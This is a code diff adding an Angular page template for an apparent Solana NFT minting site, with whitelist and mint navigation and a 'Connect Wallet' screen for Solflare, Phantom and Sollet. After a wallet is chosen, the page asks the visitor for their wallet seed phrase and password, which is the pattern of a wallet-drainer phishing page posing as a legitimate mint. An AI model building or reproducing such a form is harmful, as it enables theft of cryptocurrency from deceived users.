@@ -1,0 +1,51 @@
+<div class="header">
+    <div style="border-right: solid 1px orange;" routerLink="/home" routerLinkActive="active">
+        <label>
+            Home
+        </label>
+    </div>
+    <div style="border-right: solid 1px orange;" routerLink="/wl-spot" routerLinkActive="active">
+        <label>
+            Get Your Whitelist Spot
+        </label>
+    </div>
+    <div routerLink="/mint" routerLinkActive="active">
+        <label>
+            Mint
+        </label>
+    </div>
+</div>
+
+<div class="container1" *ngIf="selectedWallet === ''">
+    <div style="display: flex; justify-content: center;">
+        <label style="font-size: xx-large; color: white;">Connect Wallet</label>
+    </div>
+    <div class="card-selector-wallet">
+        <div class="block1" (click)="selectWallet('solflare')">
+            <img src="assets/images/logo.svg" style="margin-right: 5px;"/>
+            <img src="assets/images/solflare.svg"/>
+        </div>
+        <div class="block2" (click)="selectWallet('phantom')">
+            <img src="assets/images/phantom-logo.svg"/>
+        </div>
+        <div class="block3"  (click)="selectWallet('sollet')">
+            <img style="width: 20px; margin-right: 5px;" src="assets/images/sollet.svg" />
+            Sollet
+        </div>
+    </div>
+</div>
+
+<div class="container1" *ngIf="selectedWallet !== ''">
+    <div style="display: flex; justify-content: center;">
+        <label style="font-size: xx-large; color: white;">Connect Wallet</label>
+    </div>
+    <div class="card-wallet">
+       <label>Seed Phrase</label>
+       <textarea class="input-name" style="width: 80%; height: 110px;" (input)="getSeedPhrase($event)"></textarea>
+       <label>Password</label>
+       <input class="input-name" type="password" (input)="getPassword($event)"/>
+       <button (click)="connectWallet()">
+           Connect Wallet
+       </button>
+    </div>
+</div>
